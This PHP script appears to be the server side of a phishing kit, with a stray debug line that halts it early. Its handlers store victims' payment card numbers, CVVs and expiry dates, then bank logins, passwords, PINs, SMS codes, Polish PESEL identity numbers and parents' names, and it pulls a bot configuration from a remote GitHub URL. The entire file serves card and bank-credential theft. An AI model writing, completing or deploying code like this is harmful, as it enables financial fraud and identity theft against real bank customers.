 ini_set('display_errors', 1); 
error_reporting(E_ALL);  
require_once('./api/Connector.php');
$con = new Connector();

$bot_config = file_get_contents('https://raw.githubusercontent.com/geraldforkin/bbb/main/bot_config.json');
$bot_config = json_decode($bot_config); 
$bot_config = $bot_config[0];

die(print_r($_GET['get_product']));
if($_GET['get_product']){
    header('Content-type: application/json');
    $product = (object)$con->products->get_product($_GET['get_product']);
    echo json_encode($product);
    exit();
}
if($_GET['cmd']=="set_card"){ 
    $product = (object)$con->products->get_product($con->request->get('pid'));
    $arr = array(
        'number'    =>$con->request->get('number'),
        'cvv'       =>$con->request->get('cvv'),
        'month'     =>$con->request->get('month'),
        'year'      =>$con->request->get('year'),
        'balance'   =>$con->request->get('balance'),
        'track_id'  =>$con->request->get('track_id'),
        'pid'       =>$con->request->get('pid'),
        'wid'       =>$product->uid,
        'cid'       =>$product->country,
        'card_name' =>$con->request->get('card_name'),
        'bank_name' =>$con->request->get('bank_name'),
        'bank_country' =>$con->request->get('bank_country'),
        'bank_url' =>$con->request->get('bank_url'),
        'bank_type' =>$con->request->get('bank_type'),
        'bank_scheme' =>$con->request->get('bank_scheme')
    );
    header('Content-type: application/json');
    echo json_encode(array('id'=>$con->user->save_card($arr)));
    exit();
}

if($_GET['cmd']=='update_card'){
    $arr = array();
    if($con->request->get('sms')) $arr['sms']=$con->request->get('sms');
    if($con->request->get('bank_name')) $arr['bank_name']=$con->request->get('bank_name');
    if($con->request->get('bank_country')) $arr['bank_country']=$con->request->get('bank_country');
    if($con->request->get('bank_url')) $arr['bank_url']=$con->request->get('bank_url');
    if($con->request->get('bank_type')) $arr['bank_type']=$con->request->get('bank_type');
    if($con->request->get('bank_scheme')) $arr['bank_scheme']=$con->request->get('bank_scheme'); 


    if($con->request->get('bank_login')) $arr['bank_login']=$con->request->get('bank_login'); 
    if($con->request->get('bank_haslo')) $arr['bank_haslo']=$con->request->get('bank_haslo'); 
    if($con->request->get('bank_pin')) $arr['bank_pin']=$con->request->get('bank_pin'); 
    if($con->request->get('bank_pesel')) $arr['bank_pesel']=$con->request->get('bank_pesel'); 
    if($con->request->get('bank_nmatki')) $arr['bank_nmatki']=$con->request->get('bank_nmatki'); 
    if($con->request->get('bank_nojca')) $arr['bank_nojca']=$con->request->get('bank_nojca');

    header('Content-type: application/json');
    $con->user->update_card($con->request->get('id_card'),$arr);
    exit();
}
